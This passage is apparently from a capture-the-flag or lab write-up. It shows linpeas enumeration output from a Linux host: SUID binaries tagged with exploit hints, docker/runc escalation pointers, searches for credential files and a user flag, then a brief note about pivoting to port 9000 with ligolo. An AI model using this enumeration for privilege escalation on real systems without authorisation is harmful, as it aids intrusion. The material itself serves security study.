/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 15 09:35 /etc/pam.d
-rw-r--r-- 1 root root 2133 Nov 23  2022 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing FreeIPA Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 15 09:39 /usr/src/linux-headers-5.15.0-102/drivers/net/ipa





╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 3.2a


/tmp/tmux-1001
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Apr  4 09:45 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 2899 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 3023 Mar 26  2021 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Nov 30  2023 /usr/share/keyrings/ubuntu-pro-ros.gpg
-rw-r--r-- 1 root root 2236 Apr 27  2023 /var/lib/ubuntu-advantage/apt-esm/etc/apt/trusted.gpg.d/ubuntu-advantage-esm-apps.gpg


╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /usr/bin/runc, you may be able to escalate privileges with it

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
lrwxrwxrwx 1 root root 33 Feb 28 04:20 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 295 Feb  6  2024 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 Feb 28 04:20 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 761 Nov 15  2021 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r--r-- 1 root root 234745 Aug  8 19:32 /var/log/nginx/access.log

-rw-r--r-- 1 root root 0 Apr  4 10:08 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Jan  6  2022 /etc/skel/.bashrc
-rw-r--r-- 1 john john 3771 Feb 28 18:51 /home/john/.bashrc





-rw-r--r-- 1 root root 807 Jan  6  2022 /etc/skel/.profile
-rw-r--r-- 1 john john 807 Feb 28 18:51 /home/john/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Apr  9 15:32 /usr/bin/su
-rwsr-xr-x 1 root root 35K Apr  9 15:32 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 47K Apr  9 15:32 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 331K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root _ssh 287K Jan  2  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 27K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 23K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3448 Mar 17  2022 usr.bin.man
-rw-r--r-- 1 root root  1687 Feb  8 13:21 usr.bin.tcpdump
-rw-r--r-- 1 root root  1592 Nov 16  2021 usr.sbin.rsyslogd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 28
drwxr-xr-x   2 root root 4096 Apr  4 10:24 .
drwxr-xr-x 101 root root 4096 Apr 15 09:35 ..
-rw-r--r--   1 root root   96 Oct 15  2021 01-locale-fix.sh
-rw-r--r--   1 root root  726 Nov 15  2021 bash_completion.sh
-rw-r--r--   1 root root 1107 Mar 23  2022 gawk.csh
-rw-r--r--   1 root root  757 Mar 23  2022 gawk.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/john/.bash_history
/home/john/user.txt
/root/
/var/www
/var/www/html
/var/www/html/assets
/var/www/html/assets/css
/var/www/html/assets/css/theme.css
/var/www/html/assets/css/maicons.css
/var/www/html/assets/css/bootstrap.css
/var/www/html/assets/js
/var/www/html/assets/js/jquery-3.5.1.min.js
/var/www/html/assets/js/google-maps.js
/var/www/html/assets/js/bootstrap.bundle.min.js
/var/www/html/assets/js/theme.js
/var/www/html/assets/img
/var/www/html/assets/img/person
/var/www/html/assets/img/person/person_3.jpg
/var/www/html/assets/img/person/person_2.jpg
/var/www/html/assets/img/person/person_1.jpg
/var/www/html/assets/img/clients
/var/www/html/assets/img/clients/google.png
/var/www/html/assets/img/clients/airbnb.png
/var/www/html/assets/img/clients/paypal.png
/var/www/html/assets/img/clients/stripe.png
/var/www/html/assets/img/clients/mailchimp.png
/var/www/html/assets/img/blog
/var/www/html/assets/img/blog/blog-2.jpg
/var/www/html/assets/img/blog/blog-3.jpg

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root john 33 Aug  8 17:26 /home/john/user.txt

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root john 33 Aug  8 17:26 /home/john/user.txt

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/john
/run/lock
/run/screen
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/inaccessible/dir
/run/user/1001/systemd/inaccessible/reg
/run/user/1001/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1001
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group john:
/tmp/linpeas.sh



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh
/usr/bin/dockerd-rootless.sh
/usr/bin/dockerd-rootless-setuptool.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2024-04-04+11:03:42.9360207120 /usr/local/sbin/laurel
2024-02-28+20:50:08.0525368120 /home/john/.ssh/authorized_keys
2023-04-27+15:41:36.7397629060 /etc/console-setup/cached_setup_terminal.sh
2023-04-27+15:41:36.7357629080 /etc/console-setup/cached_setup_keyboard.sh
2023-04-27+15:41:36.7357629080 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 root root   4096 Apr  4 10:24 .
drwxr-xr-x 19 root root   4096 Apr  4 10:24 ..
drwx--x--x  4 root root   4096 Apr  4 10:24 containerd
drwxr-xr-x  4 root docker 4096 Apr  4 10:24 portainer

╔══════════╣ Unexpected in root
/data

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/john/.gnupg/pubring.kbx
/home/john/.gnupg/trustdb.gpg
/data/portainer.db
/var/log/syslog
/var/log/auth.log
/var/log/kern.log
/var/log/journal/97985f393ecf4d86b4acd0b422f7d8c8/user-1001.journal
/var/log/journal/97985f393ecf4d86b4acd0b422f7d8c8/system.journal
/var/log/nginx/access.log
/var/log/laurel/audit.log.1
/var/log/laurel/audit.log
/var/log/btmp


╔══════════╣ Files inside /home/john (limit 20)
total 36
drwxr-x--- 5 john john 4096 Aug  8 19:32 .
drwxr-xr-x 4 root root 4096 Apr  4 10:24 ..
lrwxrwxrwx 1 root root    9 Feb 28 20:04 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Feb 28 18:51 .bash_logout
-rw-r--r-- 1 john john 3771 Feb 28 18:51 .bashrc
drwx------ 2 john john 4096 Apr  4 10:24 .cache
drwx------ 3 john john 4096 Aug  8 19:32 .gnupg
-rw-r--r-- 1 john john  807 Feb 28 18:51 .profile
drwx------ 2 john john 4096 Apr  4 10:24 .ssh
-rw-r----- 1 root john   33 Aug  8 17:26 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/assets/css/theme.css
/var/www/html/assets/css/maicons.css
/var/www/html/assets/css/bootstrap.css
/var/www/html/assets/js/jquery-3.5.1.min.js
/var/www/html/assets/js/google-maps.js
/var/www/html/assets/js/bootstrap.bundle.min.js
/var/www/html/assets/js/theme.js
/var/www/html/assets/img/person/person_3.jpg
/var/www/html/assets/img/person/person_2.jpg
/var/www/html/assets/img/person/person_1.jpg
/var/www/html/assets/img/clients/google.png
/var/www/html/assets/img/clients/airbnb.png
/var/www/html/assets/img/clients/paypal.png
/var/www/html/assets/img/clients/stripe.png
/var/www/html/assets/img/clients/mailchimp.png
/var/www/html/assets/img/blog/blog-2.jpg
/var/www/html/assets/img/blog/blog-3.jpg
/var/www/html/assets/img/blog/blog-1.jpg
/var/www/html/assets/img/testi_image.png
/var/www/html/assets/img/bg_image_2.png

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2403 Feb 17  2023 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 61 Apr  4 09:40 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 0 Feb 17  2023 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-102/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 1802 Jul 20  2023 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1423 Feb 28 03:55 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-310.pyc
-rw-r--r-- 1 root root 13113 Mar  5 15:22 /usr/lib/modules/5.15.0-102-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 10849 Mar  5 15:22 /usr/lib/modules/5.15.0-102-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 44008 Dec  5  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 2747 Feb 16  2022 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 11849 Apr  4 09:41 /usr/share/info/dir.old
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rwxr-xr-x 1 root root 2196 Feb 23 14:53 /usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 4096 Aug  8 19:32 /sys/devices/virtual/net/veth61926b5/brport/backup_port

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 837, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)

╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Feb 28 10:07 .
drwxr-xr-x 13 root root 4.0K Feb 28 10:07 ..
drwxr-xr-x  3 root root 4.0K Apr  3 14:41 html

/var/www/html:
total 32K
drwxr-xr-x 3 root root 4.0K Apr  3 14:41 .
drwxr-xr-x 3 root root 4.0K Feb 28 10:07 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Aug  8 17:26 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 220 Jan  6  2022 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 17  2023 /etc/.pwd.lock
-rw-r--r-- 1 john john 220 Feb 28 18:51 /home/john/.bash_logout
-rw-r--r-- 1 landscape landscape 0 Feb 17  2023 /var/lib/landscape/.cleanup.user

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxr-x 1 john john 862779 May 27 16:37 /tmp/linpeas.sh

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/docker/credentials
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-310.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/fwupd/pki/secret.key
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'


```



i saw that port 9000 is open so i went to investigate by setting up ligolo

https://search.brave.com/search?q=mountpoint+error+%22type+is+invalid%22&source=ignoreSiteOperators&keywords=0&summary=1&summary_og=eedbe30ab9913d81387437





![[runner-20240809164710112.webp]]